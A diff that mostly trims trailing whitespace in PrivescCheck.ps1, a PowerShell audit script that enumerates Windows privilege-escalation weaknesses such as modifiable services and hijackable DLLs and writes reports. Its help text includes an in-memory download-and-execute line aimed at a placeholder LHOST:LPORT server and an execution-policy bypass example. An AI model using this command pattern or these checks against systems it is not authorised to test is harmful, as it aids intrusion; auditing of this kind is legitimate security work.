             if ($ServiceRestart) { $UserCanRestart = $True; $Status = $ServiceRestart.Status } else { $UserCanRestart = $False }
-    
+
             # Can we start the service?
             $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
             if ($ServiceStart) { $UserCanStart = $True; $Status = $ServiceStart.Status } else { $UserCanStart = $False }
 
-            $ServiceItem = New-Object -TypeName PSObject 
+            $ServiceItem = New-Object -TypeName PSObject
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
@@ -6287,34 +6287,34 @@ function Invoke-ServicesPermissionsCheck {
     <#
     .SYNOPSIS
 
-    Enumerates the services the current can modify through the service manager. In addition, it 
-    shows whether the service can be started/restarted. 
-    
+    Enumerates the services the current can modify through the service manager. In addition, it
+    shows whether the service can be started/restarted.
+
     Author: @itm4n
     License: BSD 3-Clause
 
     .DESCRIPTION
 
     This is based on the original "Get-ModifiableService" from PowerUp.
-    
+
     .LINK
 
     https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 
     #>
-    
+
     [CmdletBinding()] param()
 
-    # Get-ServiceList returns a list of custom Service objects 
-    # The properties of a custom Service object are: Name, DisplayName, User, ImagePath, StartMode, Type, RegsitryKey, RegistryPath 
-    # We also apply the FilterLevel 1 to filter out services which have an empty ImagePath 
+    # Get-ServiceList returns a list of custom Service objects
+    # The properties of a custom Service object are: Name, DisplayName, User, ImagePath, StartMode, Type, RegsitryKey, RegistryPath
+    # We also apply the FilterLevel 1 to filter out services which have an empty ImagePath
     $Services = Get-ServiceList -FilterLevel 1
     Write-Verbose "Enumerating $($Services.Count) services..."
 
-    # For each custom Service object in the list 
+    # For each custom Service object in the list
     ForEach ($Service in $Services) {
 
-        # Get a 'real' Service object and the associated DACL, based on its name 
+        # Get a 'real' Service object and the associated DACL, based on its name
         $TargetService = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'ChangeConfig'
 
         if ($TargetService) {
@@ -6325,11 +6325,11 @@ function Invoke-ServicesPermissionsCheck {
             $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
             if ($ServiceStart) { $UserCanStart = $True } else { $UserCanStart = $False }
 
-            $ServiceItem = New-Object -TypeName PSObject  
-            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name 
-            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath 
+            $ServiceItem = New-Object -TypeName PSObject
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
-            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $TargetService.Status 
+            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $TargetService.Status
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $UserCanStart
             $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $UserCanRestart
             $ServiceItem
@@ -6337,11 +6337,11 @@ function Invoke-ServicesPermissionsCheck {
     }
 }
 # ----------------------------------------------------------------
-# END SERVICES   
+# END SERVICES
 # ----------------------------------------------------------------
 
 # ----------------------------------------------------------------
-# BEGIN DLL HIJACKING   
+# BEGIN DLL HIJACKING
 # ----------------------------------------------------------------
 function Invoke-DllHijackingCheck {
     <#
@@ -6351,17 +6351,17 @@ function Invoke-DllHijackingCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     First, it reads the system environment PATH from the registry. Then, for each entry, it checks
     whether the current user has write permissions.
 
     #>
-    
+
     [CmdletBinding()] param()
-    
-    $SystemPath = (Get-ItemProperty -Path "Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "Path").Path 
+
+    $SystemPath = (Get-ItemProperty -Path "Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "Path").Path
     $Paths = $SystemPath.Split(';')
 
     ForEach ($Path in $Paths) {
@@ -6386,14 +6386,14 @@ function Invoke-HijackableDllsCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    On Windows, some services load DLLs without using a "secure" search path. Therefore, they 
+    On Windows, some services load DLLs without using a "secure" search path. Therefore, they
     try to load them from the folders listing in the %PATH% environment variable. If one of these
     folders is configured with weak permissions, a local attacker may plant a malicious version of
     a DLL in order to execute arbitrary code in the context of the service.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-HijackableDllsCheck
@@ -6447,8 +6447,8 @@ function Invoke-HijackableDllsCheck {
         [void]$WindowsDirectories.Add($env:windir)
 
         ForEach ($WindowsDirectory in [string[]]$WindowsDirectories) {
-            $Path = Join-Path -Path $WindowsDirectory -ChildPath $Name 
-            $Null = Get-Item -Path $Path -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem 
+            $Path = Join-Path -Path $WindowsDirectory -ChildPath $Name
+            $Null = Get-Item -Path $Path -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem
             if (-not $ErrorGetItem) {
                 return $True
             }
@@ -6465,7 +6465,7 @@ function Invoke-HijackableDllsCheck {
             [boolean]$RebootRequired = $True
         )
 
-        $Service = Get-ServiceFromRegistry -Name $ServiceName 
+        $Service = Get-ServiceFromRegistry -Name $ServiceName
         if ($Service -and ($Service.StartMode -ne "Disabled")) {
 
             if (-not (Test-DllExists -Name $DllName)) {
@@ -6474,7 +6474,7 @@ function Invoke-HijackableDllsCheck {
                 $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
                 $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
                 $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value $Service.User
-                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $RebootRequired 
+                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $RebootRequired
                 $HijackableDllItem
             }
         }
@@ -6521,16 +6521,16 @@ function Invoke-HijackableDllsCheck {
     if (($OsVersion.Major -eq 10) -or (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -ge 2) -and ($OsVersion.Minor -le 3))) {
 
         Test-HijackableDll -ServiceName "NetMan" -DllName "wlanapi.dll" -Description "Loaded by NetMan when listing network interfaces" -RebootRequired $False
-        
+
     }
 }
 # ----------------------------------------------------------------
-# END DLL HIJACKING   
+# END DLL HIJACKING
 # ----------------------------------------------------------------
 #endregion Checks
 
 # ----------------------------------------------------------------
-# Main  
+# Main
 # ----------------------------------------------------------------
 #region Main
 
@@ -6543,14 +6543,14 @@ function Invoke-PrivescCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    This script aims to identify security misconfigurations that are relevant for privilege 
-    escalation. It also provides some additional information that may help penetration testers to 
-    choose between several potential exploits. For example, if you find that a service is 
+    This script aims to identify security misconfigurations that are relevant for privilege
+    escalation. It also provides some additional information that may help penetration testers to
+    choose between several potential exploits. For example, if you find that a service is
     vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know
-    hos often the machine is rebooted (in the case of a server). If you see that it is rebooted 
+    hos often the machine is rebooted (in the case of a server). If you see that it is rebooted
     every night for instance, you may want to attempt an exploit.
 
     .PARAMETER Extended
@@ -6572,19 +6572,19 @@ function Invoke-PrivescCheck {
     .PARAMETER Format
 
     Select the format of the output file (e.g.: TXT, HTML or CSV).
-    
+
     .EXAMPLE
 
-    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck 
+    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck
 
-    .EXAMPLE 
+    .EXAMPLE
 
     C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
     .EXAMPLE
 
     C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/P
-    rivescCheck.ps1'; Invoke-PrivescCheck" 
+    rivescCheck.ps1'; Invoke-PrivescCheck"
 
     #>
 
@@ -6598,7 +6598,7 @@ function Invoke-PrivescCheck {
         [ValidateSet("TXT", "HTML", "CSV")][string[]]$Format
     )
 
-    # Check wether the current process has admin privileges. 
+    # Check wether the current process has admin privileges.
     # The following check was taken from Pow*rUp.ps1
     $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
     if($IsAdmin) {
@@ -6690,7 +6690,7 @@ function Invoke-PrivescCheck {
             }
         }
     }
-    
+
     # Load plugin scripts if any
     $AllChecks | Where-Object { $_.File -ne "" } | Select-Object -ExpandProperty File | Sort-Object -Unique | ForEach-Object {
         Write-Verbose "Plugin required: $($_)"
@@ -6703,7 +6703,7 @@ function Invoke-PrivescCheck {
 
         $CurrentCheck = $_
 
-        # Get the 'RunIfAdmin' flag's value from the CSV data 
+        # Get the 'RunIfAdmin' flag's value from the CSV data
         $RunIfAdmin = [System.Convert]::ToBoolean($CurrentCheck.RunIfAdmin)
 
         if (($IsAdmin -and $RunIfAdmin) -or (-not $IsAdmin)) {
@@ -6713,10 +6713,10 @@ function Invoke-PrivescCheck {
 
             # Get the 'Extended' flag's value from the CSV data
             $ExtendedCheck = [System.Convert]::ToBoolean($CurrentCheck.Extended)
-            
+
             if ($Extended -or ((-not $Extended) -and (-not $ExtendedCheck))) {
 
-                # If the 'Extended' option was specified, run the check. 
+                # If the 'Extended' option was specified, run the check.
                 # If the 'Extended' option was not specified, run the check only if is is not
                 # marked as an "Extended" one.
 
@@ -6732,8 +6732,8 @@ function Invoke-PrivescCheck {
 
                 } else {
 
-                    # If the 'Silent' option was not specified, print a banner that shows some 
-                    # information about the current check. Then, run the check and print the 
+                    # If the 'Silent' option was not specified, print a banner that shows some
+                    # information about the current check. Then, run the check and print the
                     # output either as a table or a list, depending on the 'Format' value in
                     # the CSV data.
 
@@ -6749,8 +6749,8 @@ function Invoke-PrivescCheck {
     # Therefore, this will be only visible if run from a 'real' terminal.
     Write-PrivescCheckAsciiReport
 
-    # If the 'Report' option was specified, write a report to a file using the value of this 
-    # parameter as the basename (or path + basename). The extension is then determined based 
+    # If the 'Report' option was specified, write a report to a file using the value of this
+    # parameter as the basename (or path + basename). The extension is then determined based
     # on the chosen format(s).
     if ($Report) {
 
@@ -6764,7 +6764,7 @@ function Invoke-PrivescCheck {
         $Format | ForEach-Object {
 
             # For each format, build the name of the output report file as BASENAME + . + EXT.
-            # Then generate the report corresponding to the current format and write it to a 
+            # Then generate the report corresponding to the current format and write it to a
             # file using the previously formatted filename.
 
             $ReportFileName = "$($Report.Trim()).$($_.ToLower())"
@@ -6780,7 +6780,7 @@ function Invoke-PrivescCheck {
         }
     }
 
-    # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' 
+    # If the 'Extended' mode was not specified, print a warning message, unless the 'Force'
     # parameter was specified.
     if ((-not $Extended) -and (-not $Force) -and (-not $Silent)) {
 
@@ -6866,7 +6866,7 @@ function Write-CheckResult {
     )
 
     if ($CheckResult.ResultRaw) {
-            
+
         "[*] Found $(([object[]]$CheckResult.ResultRaw).Length) result(s)."
 
         if ($CheckResult.Format -eq "Table") {
@@ -6874,10 +6874,10 @@ function Write-CheckResult {
         } elseif ($CheckResult.Format -eq "List") {
             $CheckResult.ResultRaw | Format-List
         }
-        
+
     } else {
 
-        # If no result was returned by the check, print a message that shows that 
+        # If no result was returned by the check, print a message that shows that
         # the host is not vulnerable if it's a "vuln" check or, printer a message
         # that shows that nothing was found.
 
@@ -6909,7 +6909,7 @@ function Write-CsvReport {
     [CmdletBinding()] param(
         [object[]]$AllResults
     )
-    
+
     $AllResults | Sort-Object -Property "Category" | Select-Object "Category","DisplayName","Description","Compliance","Severity","ResultRawString" | ConvertTo-Csv -NoTypeInformation
 }
 
@@ -6944,8 +6944,8 @@ for (var i=0; i<cells.length; i++) {
     } else if (cells[i].innerHTML == "N/A") {
         cells[i].innerHTML = "<span class=\"label other\">N/A</span>"
     }
-    
-    // If a cell is too large, we need to make it scrollable. But 'td' elements are not 
+
+    // If a cell is too large, we need to make it scrollable. But 'td' elements are not
     // scrollable so, we need make it a 'div' first and apply the 'scroll' (c.f. CSS) style to make
     // it scrollabale.
     if (cells[i].offsetHeight > 200) {
@@ -6960,7 +6960,7 @@ body {
     font:1.2em normal Arial,sans-serif;
     color:#34495E;
     }
-      
+
 h1 {
     text-align:center;
     text-transform:uppercase;
@@ -6968,13 +6968,13 @@ h1 {
     font-size:2.5em;
     margin:20px 0;
 }
-      
+
 table {
     border-collapse:collapse;
     width:100%;
     border:2px solid #6699ff;
 }
-      
+
 th {
     color:white;
     background:#6699ff;
@@ -7000,11 +7000,11 @@ tbody td:nth-child(6) {
     font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
     text-align:left;
 }
-      
+
 tbody tr:nth-child(even) {
     background:#ECF0F1;
 }
-      
+
 tbody tr:hover {
     background:#BDC3C7;
     color:#FFFFFF;
@@ -7046,7 +7046,7 @@ $($JavaScript)
 </html>
 "@
 
-    $TableHtml = $AllResults | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" -Fragment  
+    $TableHtml = $AllResults | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" -Fragment
     $Html = $Html.Replace("BODY_TO_REPLACE", $TableHtml)
     $Html
 }
@@ -7059,13 +7059,13 @@ function Write-PrivescCheckAsciiReport {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Once all the checks were executed, this function writes a table in ASCII-art that summarizes
     the results with fancy colors. As a pentester or a system administrator, this should help you
     quickly spot weaknesses on the local machine.
-    
+
     .EXAMPLE
 
     PS C:\> Write-PrivescCheckAsciiReport
@@ -7100,7 +7100,7 @@ function Write-PrivescCheckAsciiReport {
     #>
 
     [CmdletBinding()] param(
-        
+
     )
 
     Write-Host "+-----------------------------------------------------------------------------+"
@@ -7149,12 +7149,12 @@ function Write-PrivescCheckAsciiReport {
         $Padding = ' ' * $(63 - $Message.Length)
 
         Write-Host -NoNewline " $($_.Category.ToUpper()) > $($_.DisplayName)"
-        
+
         if ($_.ResultRaw) {
             Write-Host -NoNewLine " ->"
             Write-Host -NoNewLine -ForegroundColor $SeverityColor " $(([object[]]$_.ResultRaw).Length) result(s)"
         }
-        
+
         Write-Host "$($Padding) |"
     }
 
